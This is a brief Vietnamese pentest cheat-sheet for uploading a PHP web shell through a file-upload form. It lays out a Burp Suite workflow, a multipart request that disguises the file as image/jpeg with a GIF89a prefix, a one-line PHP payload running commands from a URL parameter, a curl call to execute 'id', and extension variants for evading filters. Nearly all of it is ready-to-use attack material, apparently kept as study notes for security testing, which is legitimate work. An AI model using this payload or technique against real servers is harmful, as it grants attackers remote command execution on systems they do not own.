> [!important] **Upload Shell**
# Quy trình
Xác định upload ⇒ Burp Suite ⇒ Upload shell (trước đó nên gửi request POST là các định dạng không bị filter) ⇒ Quan sát respond ⇒ Bị filter thì đổi đuôi file ⇒
```Bash
curl "http://example.com/uploads/shell.phtml?cmd=id"
```
⇒ Thành công thì có thể ls, cat, cd, … (nhớ dùng Burp Suite để gửi respond theo chuẩn URL, không space)
---
# Chỉnh sửa request
```PHP
Content-Length: \#Để trống để Burp Suite tự gán
Content-Disposition: form-data; name = "input_image"; filename = "shell.phtml"
Content-Type: image/jpeg
```
```PHP
\#Nội dung payload
GIF89a \#Có thể có hoặc không
<?php system($_GET['cmd']); >
```
> **Các đuôi**: .phtml, .pHp, .phar, .php5, .php7, .php.jpg, …